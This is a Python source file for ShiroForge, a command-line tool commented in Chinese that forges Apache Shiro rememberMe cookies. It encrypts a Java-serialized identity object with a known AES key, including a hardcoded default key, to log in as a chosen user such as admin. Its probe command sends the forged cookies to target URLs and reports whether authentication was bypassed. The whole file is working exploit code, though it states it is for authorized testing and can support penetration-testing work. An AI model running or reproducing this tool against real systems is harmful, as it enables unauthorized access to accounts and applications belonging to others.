#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShiroForge v1.0.0 — Shiro rememberMe 伪造登录（认证绕过）验证工具

原理一句话：
    rememberMe = base64( 随机IV(16B) ‖ AES-128-CBC( Java序列化对象, PKCS7 ) )
    用目标的 AES 密钥 + 目标自己的身份类，造一枚"身份证"，即可通过 Shiro 的
    rememberMe 机制被识别为已登录用户 —— 即认证绕过。

子命令：
    build   编译 Java 载荷生成器（等价 build.sh / build.ps1）
    make    生成载荷 → 加密成 cookie（可 --check 自检）
    check   本地自检一枚 cookie：解密、校验结构、列出内嵌的类名
    probe   用 cookie 访问受保护页面，与"无 cookie 基线"对比并给出结论

仅限授权测试（自己的系统 / 已获书面授权的目标）使用。
"""

import argparse
import base64
import json
import os
import re
import subprocess
import sys

VERSION = "1.0.0"

ROOT = os.path.dirname(os.path.abspath(__file__))
JAR = os.path.join(ROOT, "lib", "shiro-core-1.7.1.jar")
CLASSES = os.path.join(ROOT, "build", "classes")
DEFAULT_KEY = "Z3VucwAAAAAAAAAAAAAAAA=="      # base64("guns" + 12*0x00)，Guns 系默认 key
JAVA_MAGIC = bytes.fromhex("aced0005")
OK, WARN, ERR = "[+]", "[*]", "[!]"


# ----------------------------------------------------------------------------- utils
def die(msg, code=1):
    print(f"{ERR} {msg}", file=sys.stderr)
    sys.exit(code)


def need_crypto():
    """pycryptodome 的 import 名是 Crypto（不是 Cryptodome）。缺失时给出可执行建议。"""
    try:
        from Crypto.Cipher import AES                      # noqa: F401
        from Crypto.Util.Padding import pad, unpad         # noqa: F401
    except ImportError:
        die("缺少 pycryptodome。请用 uv 运行（依赖见 requirements.txt）：\n"
            f"    uv run --with-requirements requirements.txt python shiroforge.py {' '.join(sys.argv[1:])}\n"
            "  或使用包装脚本： ./shiroforge.sh   /   .\\shiroforge.cmd", 3)


def need_build():
    if not os.path.isdir(CLASSES) or not os.path.isfile(JAR):
        die("尚未构建。请先执行： python shiroforge.py build   (或 build.sh / build.ps1)", 4)


def classpath():
    return CLASSES + os.pathsep + JAR


def run_java(main, jargs):
    """调用 Java 载荷生成器；返回 stdout 文本"""
    cmd = ["java", "-cp", classpath(), main] + [str(a) for a in jargs]
    try:
        p = subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True,
                           encoding="utf-8", errors="replace")
    except FileNotFoundError:
        die("找不到 java。生成载荷需要 JDK 8+（javac/java 在 PATH 中）。", 4)
    except subprocess.TimeoutExpired:
        die("java 执行超时。", 4)
    if p.returncode != 0:
        tail = (p.stdout + "\n" + p.stderr).strip()
        hint = ""
        if "NotSerializableException" in tail:
            hint = "\n[hint] 该身份类未实现 java.io.Serializable；Shiro 的 rememberMe 要求载荷可序列化。"
        elif "ClassNotFoundException" in tail:
            hint = ("\n[hint] 本地 classpath 上没有这个类。当前可用的身份类存根只有：\n"
                    + "".join(f"        - {n}\n" for n in available_stubs())
                    + "        要用别的目标：把它的身份类存根放到 java/stubs/<包路径>/ 下（同包名/类名/"
                      "serialVersionUID/字段名），再 python shiroforge.py build。")
        elif "NoSuchMethodException" in tail:
            hint = "\n[hint] 该身份类没有公开无参构造，需在存根里补一个。"
        die(f"java 执行失败 (rc={p.returncode}):\n{tail}{hint}", p.returncode)
    return p.stdout.strip()


def available_stubs():
    """扫描 java/stubs 下的存根，返回可用的 FQCN 列表（--class 只能填这些，除非自己加）"""
    base = os.path.join(ROOT, "java", "stubs")
    found = []
    for dirpath, _dirs, files in os.walk(base):
        for fn in files:
            if not fn.endswith(".java"):
                continue
            pkg = ""
            try:
                with open(os.path.join(dirpath, fn), "r", encoding="utf-8", errors="replace") as f:
                    m = re.search(r"^\s*package\s+([\w.]+)\s*;", f.read(4000), re.M)
                pkg = m.group(1) if m else ""
            except OSError:
                pass
            found.append((pkg + "." + fn[:-5]) if pkg else fn[:-5])
    return sorted(set(found))


def read_cookie_arg(value):
    """参数既可以是 cookie 值，也可以是存放 cookie 的文件路径"""
    if value is None:
        return None
    if os.path.isfile(value):
        with open(value, "r", encoding="utf-8") as f:
            return f.read().strip()
    return value.strip()


def clean_b64(s):
    """去掉空白与已有 '='，再按 4 的倍数补齐（避免重复填充导致解码失败）"""
    s = re.sub(r"\s+", "", s or "").rstrip("=")
    return s + "=" * (-len(s) % 4)


def b64key(key_b64):
    try:
        k = base64.b64decode(clean_b64(key_b64), validate=True)
    except Exception:
        die(f"--key 不是合法 base64：{key_b64}", 2)
    if len(k) != 16:
        die(f"--key 解码后应为 16 字节（AES-128），实际 {len(k)} 字节。"
            "若目标是 Shiro>=1.4.2 的 AES-GCM 模式，本工具的 CBC 实现不适用。", 2)
    return k


def norm_url(u):
    return u if "://" in u else "http://" + u


# ----------------------------------------------------------------------------- 核心编解码
def encrypt_payload(payload, key):
    """返回 (cookie_b64, iv_hex)"""
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    iv = os.urandom(16)                                     # 随机 IV：每次结果不同，属正常
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))
    return base64.b64encode(iv + ct).decode(), iv.hex()


def decrypt_cookie(cookie, key):
    """返回 (解密后字节, 结构诊断信息 dict)"""
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

    info = {"cookie_chars": len(cookie or ""), "decoded_len": 0,
            "len_is_multiple_of_16": False, "iv": "", "plain_len": 0,
            "java_magic": False, "padding_ok": False, "error": None}

    try:
        raw = base64.b64decode(clean_b64(cookie), validate=True)
    except Exception as e:
        info["error"] = f"base64 解码失败：{e}"
        return b"", info

    info["decoded_len"] = len(raw)
    if len(raw) < 32 or len(raw) % 16 != 0:
        info["error"] = f"解码后长度非法（{len(raw)} 字节，应为 16 的倍数且 >= 32）"
        return b"", info
    info["len_is_multiple_of_16"] = True

    iv, ct = raw[:16], raw[16:]
    info["iv"] = iv.hex()
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    info["plain_len"] = len(pt)
    info["java_magic"] = pt[:4] == JAVA_MAGIC
    try:
        pt = unpad(pt, 16)
        info["padding_ok"] = True
    except ValueError:
        info["padding_ok"] = False
        if not info["java_magic"]:
            info["error"] = "解密结果不是 Java 序列化流且 PKCS7 填充非法 → 很可能密钥不对"
    return pt, info


def embedded_classes(pt):
    """精确提取序列化流里的类名：TC_CLASSDESC(0x72) + 2 字节长度 + 类名。
    用于肉眼判断"这张卡里装的身份类，是不是目标认的那一个"。"""
    names = set()
    for i in range(len(pt) - 3):
        if pt[i] != 0x72:                          # TC_CLASSDESC
            continue
        ln = int.from_bytes(pt[i + 1:i + 3], "big")
        if not (3 < ln < 200) or i + 3 + ln > len(pt):
            continue
        raw = pt[i + 3:i + 3 + ln]
        if all(32 <= b < 127 for b in raw) and b"." in raw:
            names.add(raw.decode("ascii"))
    return sorted(names)


# ----------------------------------------------------------------------------- 子命令
def cmd_build(args):
    script = "build.ps1" if os.name == "nt" else "build.sh"
    path = os.path.join(ROOT, script)
    if not os.path.isfile(path):
        die(f"找不到构建脚本 {script}", 4)
    cmd = (["powershell", "-ExecutionPolicy", "Bypass", "-File", path] if os.name == "nt"
           else ["bash", path])
    sys.exit(subprocess.run(cmd, cwd=ROOT).returncode)


def gen_payload(args, out_path):
    if getattr(args, "string", False):
        return run_java("GenSPCmin", ["simple", out_path])
    if getattr(args, "placeholder", False):
        return run_java("GenSPCmin", ["mini", out_path])
    return run_java("GenShiroSPC", [args.cls, args.id, args.account, out_path])


def build_cookie(args):
    """生成载荷 + 加密 → (cookie, info)"""
    need_build()
    need_crypto()
    payload_path = args.payload or os.path.join(ROOT, "build", "payload.bin")
    os.makedirs(os.path.dirname(payload_path), exist_ok=True)

    jout = gen_payload(args, payload_path)
    with open(payload_path, "rb") as f:
        payload = f.read()
    if not payload.startswith(JAVA_MAGIC):
        die(f"生成的载荷不是合法 Java 序列化流：{payload_path}", 5)

    key = b64key(args.key)
    cookie, iv_hex = encrypt_payload(payload, key)
    info = {"payload_file": payload_path, "payload_bytes": len(payload),
            "key_bytes": len(key), "iv": iv_hex, "cookie_chars": len(cookie),
            "java_out": jout}
    return cookie, info


def cmd_make(args):
    if getattr(args, "cls", None) == "auto":
        die("make 需要具体的身份类名。先跑 `stubs` 看清单，或用 `probe --class auto` 自动逐个试。", 2)
    cookie, info = build_cookie(args)

    print(f"{OK} 载荷: {info['payload_file']} ({info['payload_bytes']} 字节)")
    for line in (info["java_out"] or "").splitlines():
        print(f"      {line}")
    if "skip field" in (info["java_out"] or ""):
        print(f"{WARN} 有字段被跳过 → 本地存根与目标身份类的字段名不一致，"
              "目标可能返回 deleteMe（见 README「其他系统怎么适配」）")

    print(f"{OK} key {info['key_bytes']} 字节 | IV(随机) {info['iv']}")
    print(f"{OK} rememberMe={cookie}   (长度 {info['cookie_chars']})")

    out = args.out or "cookie.txt"
    with open(out, "w", encoding="utf-8") as f:
        f.write(cookie)
    print(f"{OK} 已写入 {out}")

    if args.check:
        print()
        info2 = _print_check(cookie, args.key)
        if info2["error"] or not info2["java_magic"]:
            return 1

    if args.json:
        print(json.dumps({"cookie": cookie, **info}, ensure_ascii=False, indent=2))
    print(f"\nBurp Repeater: 在请求头加一行  Cookie: rememberMe={cookie}")
    return 0


def _print_check(cookie, key_b64):
    key = b64key(key_b64 or DEFAULT_KEY)
    pt, info = decrypt_cookie(cookie, key)
    print(f"{WARN} ── cookie 自检 ──")
    print(f"      cookie 字符数      : {info['cookie_chars']}")
    print(f"      base64 解码后      : {info['decoded_len']} 字节 (16 的倍数: {info['len_is_multiple_of_16']})")
    print(f"      IV(前16字节)       : {info['iv']}")
    print(f"      明文长度           : {info['plain_len']} 字节")
    print(f"      Java 序列化魔数     : {info['java_magic']} (aced0005)")
    print(f"      PKCS7 填充合法      : {info['padding_ok']}")
    if pt:
        cls = embedded_classes(pt)
        print(f"      内嵌类名({len(cls)}) : " + (", ".join(cls[:12]) + (" ..." if len(cls) > 12 else "")))
    if info["error"]:
        print(f"{ERR}      {info['error']}")
    return info


def cmd_stubs(args):
    """列出 java/stubs 下可用的身份类存根 —— --class 只能填这些（除非自己加）"""
    names = available_stubs()
    if not names:
        print(f"{ERR} java/stubs 下没有任何身份类存根。")
        return 1
    print(f"{OK} 当前可用的身份类存根（--class 只能填下面这些）：")
    for n in names:
        print(f"      {n}")
    print(f"\n{OK} 例： shiroforge make --class {names[0]} --key <KEY>")
    print(f"{WARN} 换目标：把它的身份类存根放到 java/stubs/<包路径>/ 下，再执行 build")
    return 0


def cmd_check(args):
    need_crypto()
    cookie = read_cookie_arg(args.cookie)
    if not cookie:
        die("请用 -c/--cookie 指定 cookie 值或存放 cookie 的文件", 2)
    if not args.key:
        print(f"{WARN} 未指定 --key，使用内置默认 key（Guns 系）")
    info = _print_check(cookie, args.key)
    if info["error"] or not info["java_magic"]:
        print(f"{ERR} 结论：cookie 结构不合法（密钥可能不对）")
        return 1
    print(f"{OK} 结论：cookie 结构合法，密钥能正确解密")
    return 0


def _cookies_of(resp):
    val = resp.headers.get("Set-Cookie", "") or ""
    try:
        joined = "; ".join(resp.raw.headers.getlist("Set-Cookie"))
        if joined:
            val = joined
    except Exception:
        pass
    return val


def classify(base_status, test_status, test_cookies):
    """返回 (标签, 说明) —— 判据来自大量实测：deleteMe 与"有无输出/状态码"是两个独立层面"""
    dm = "rememberme=deleteme" in re.sub(r"\s+", "", (test_cookies or "")).lower()
    if dm:
        return "REJECTED", "响应含 rememberMe=deleteMe → 服务端拒收（密钥不对，或身份类/字段与目标不匹配）"
    if test_status == 200 and base_status in (302, 401, 403):
        return "BYPASS", f"基线 {base_status} → 带 cookie {test_status} → 认证绕过成立"
    if test_status == 500:
        return "PARTIAL", "过滤器已被穿过，但页面 500 → 该页需要目标自己的身份类（试 --class）"
    if test_status != base_status and base_status in (302, 401, 403):
        return "FILTER_PASSED", (f"基线 {base_status} → 带 cookie {test_status}（无 deleteMe）："
                                 "Shiro 过滤器已被绕过，但该路径未渲染页面"
                                 "（常见：该路径只接受 POST，或仍需目标自己的身份类）")
    if test_status == 200 and base_status == 200:
        return "NO_AUTH_REQUIRED", "该页面基线就是 200（本来无需认证）→ 换受保护页面再测"
    return "NO_EFFECT", f"基线 {base_status} → 带 cookie {test_status} → 未见绕过效果"


def cmd_probe(args):
    need_crypto()
    try:
        import requests
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception:
            pass
    except ImportError:
        die("缺少 requests。请用 uv 运行（依赖见 requirements.txt）：\n"
            f"    uv run --with-requirements requirements.txt python shiroforge.py {' '.join(sys.argv[1:])}", 3)

    candidates = []            # [(标签, cookie)] —— 给定一枚 / 现造一枚 / auto 全试
    if args.cookie:
        candidates = [("给定 cookie", read_cookie_arg(args.cookie))]
        print(f"{OK} 使用给定 cookie（长度 {len(candidates[0][1] or '')}）")
    elif getattr(args, "cls", None) == "auto":
        stubs = available_stubs()
        if not stubs:
            die("java/stubs 下没有存根，无法使用 --class auto", 4)
        print(f"{OK} --class auto：将依次尝试 {len(stubs)} 个身份类")
        for st in stubs:
            sub = argparse.Namespace(**vars(args))
            sub.cls = st
            c, info = build_cookie(sub)
            candidates.append((st, c))
            print(f"      {st}  -> cookie {info['cookie_chars']} 字符（载荷 {info['payload_bytes']} 字节）")
    elif args.cls or args.string or args.placeholder:
        c, info = build_cookie(args)
        cname = args.cls or ("--string 对照" if args.string else "--placeholder 对照")
        candidates = [(cname, c)]
        print(f"{OK} 已生成 cookie（长度 {info['cookie_chars']}，载荷 {info['payload_bytes']} 字节）")
    else:
        die("请用 -c/--cookie 给一枚 cookie，或用 --class <FQCN|auto> / --string / --placeholder 现造", 2)

    headers = {"User-Agent": args.ua, "Accept": "*/*"}
    session = requests.Session()
    results, any_bypass = [], False

    for url in args.url:
        url = norm_url(url)
        print(f"\n{WARN} ── {url} ──")
        try:
            base = session.get(url, headers=headers, timeout=args.timeout,
                               allow_redirects=False, verify=False)
        except Exception as e:
            print(f"{ERR} 请求失败：{type(e).__name__}: {e}")
            results.append({"url": url, "verdict": "ERROR", "error": str(e)})
            continue

        bc = _cookies_of(base)
        base_loc = base.headers.get("Location", "")
        print(f"      基线(无 cookie): HTTP {base.status_code}"
              + (f" -> {base_loc}" if base_loc else "")
              + (f"  [Set-Cookie: {bc[:80]}]" if bc else ""))
        if base.status_code == 400 and url.startswith("http://"):
            print(f"{WARN}      基线 400 —— 该端口可能只接受 https，把 URL 换成 https:// 再试")

        for cname, cookie in candidates:
            try:
                test = session.get(url, headers={**headers, "Cookie": f"rememberMe={cookie}"},
                                   timeout=args.timeout, allow_redirects=False, verify=False)
            except Exception as e:
                print(f"        试 [{cname}] 请求失败：{type(e).__name__}: {e}")
                results.append({"url": url, "class": cname, "verdict": "ERROR", "error": str(e)})
                continue

            tc = _cookies_of(test)
            verdict, why = classify(base.status_code, test.status_code, tc)
            hit = verdict == "BYPASS"
            any_bypass = any_bypass or hit

            print(f"        试 [{cname}]")
            print(f"          带 cookie : HTTP {test.status_code} ({len(test.content)} 字节)"
                  + (f" -> {test.headers.get('Location','')}" if test.headers.get("Location") else "")
                  + (f"  [Set-Cookie: {tc[:80]}]" if tc else ""))
            mark = {"BYPASS": "✅", "REJECTED": "❌", "PARTIAL": "⚠️", "FILTER_PASSED": "⚠️",
                    "NO_EFFECT": "⚠️", "NO_AUTH_REQUIRED": "➖"}.get(verdict, "?")
            print(f"          判据      : {mark} {verdict} — {why}")
            results.append({"url": url, "class": cname, "verdict": verdict, "reason": why,
                            "baseline_status": base.status_code, "test_status": test.status_code,
                            "baseline_set_cookie": bc, "test_set_cookie": tc})
            if hit and len(candidates) > 1:
                print("          → 命中，跳过其余身份类")
                break

    if args.json:
        print(json.dumps(results, ensure_ascii=False, indent=2))
    print()
    if any_bypass:
        print(f"{OK} 结论：至少一个 URL 认证绕过成立（BYPASS）。请保存请求/响应作为证据。")
        return 0
    print(f"{WARN} 结论：未观测到认证绕过。请核对：密钥是否正确、身份类是否为目标自己的类、"
          "目标是否已加固（不再解析客户端 rememberMe）。")
    return 3


# ----------------------------------------------------------------------------- CLI
def add_gen_args(sp, required):
    g = sp.add_mutually_exclusive_group(required=required)
    g.add_argument("--class", dest="cls", metavar="FQCN",
                   help="目标身份类全限定名，如 com.jsnjfz.manage.core.shiro.ShiroUser；"
                        "probe 时可用 auto（把 java/stubs 下的存根逐个试一遍）")
    g.add_argument("--string", action="store_true",
                   help="通用对照：principal 为字符串（只能证明密钥正确/穿过过滤器）")
    g.add_argument("--placeholder", action="store_true",
                   help="否定对照：principal 为目标必然没有的类（预期出现 deleteMe）")
    sp.add_argument("--id", default="1", help="用户 id（默认 1）")
    sp.add_argument("--account", default="admin", help="账号（默认 admin）")
    sp.add_argument("--key", default=DEFAULT_KEY, help="目标 AES 密钥(base64)，默认 Guns 系内置值")
    sp.add_argument("--payload", help="载荷输出文件（默认 build/payload.bin）")
    sp.add_argument("--json", action="store_true", help="额外输出 JSON")
    return sp


def build_parser():
    p = argparse.ArgumentParser(
        prog="shiroforge",
        description="ShiroForge — Shiro rememberMe 伪造登录（认证绕过）验证工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例：\n"
               "  python shiroforge.py build\n"
               "  python shiroforge.py make --class com.jsnjfz.manage.core.shiro.ShiroUser --id 1 --account admin --check\n"
               "  python shiroforge.py make --string --key <base64-key> -o cookie.txt\n"
               "  python shiroforge.py check -c cookie.txt --key <base64-key>\n"
               "  python shiroforge.py probe --url http://TARGET/admin -c cookie.txt\n")
    p.add_argument("--version", action="version", version=f"ShiroForge {VERSION}")
    sub = p.add_subparsers(dest="cmd", required=True)

    sub.add_parser("build", help="编译 Java 载荷生成器").set_defaults(func=cmd_build)
    sub.add_parser("stubs", help="列出当前可用的身份类存根（--class 只能填这些）").set_defaults(func=cmd_stubs)

    m = add_gen_args(sub.add_parser("make", help="生成载荷并加密成 cookie"), True)
    m.add_argument("-o", "--out", help="cookie 输出文件（默认 cookie.txt）")
    m.add_argument("--check", action="store_true", help="生成后立即自检")
    m.set_defaults(func=cmd_make)

    c = sub.add_parser("check", help="自检一枚 cookie（解密/校验结构/列出内嵌类名）")
    c.add_argument("-c", "--cookie", required=True, help="cookie 值或存放 cookie 的文件")
    c.add_argument("--key", help="目标 AES 密钥(base64)")
    c.set_defaults(func=cmd_check)

    pr = add_gen_args(sub.add_parser("probe", help="带 cookie 访问受保护页面，与基线对比给出结论"), False)
    pr.add_argument("-u", "--url", action="append", required=True, help="目标 URL（可重复）")
    pr.add_argument("-c", "--cookie", help="cookie 值或文件；不给则用 --class/--string 现造")
    pr.add_argument("--timeout", type=float, default=15.0, help="单请求超时秒数（默认 15）")
    pr.add_argument("--ua", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) ShiroForge",
                    help="User-Agent")
    pr.set_defaults(func=cmd_probe)
    return p


def main():
    args = build_parser().parse_args()
    sys.exit(args.func(args) or 0)


if __name__ == "__main__":
    main()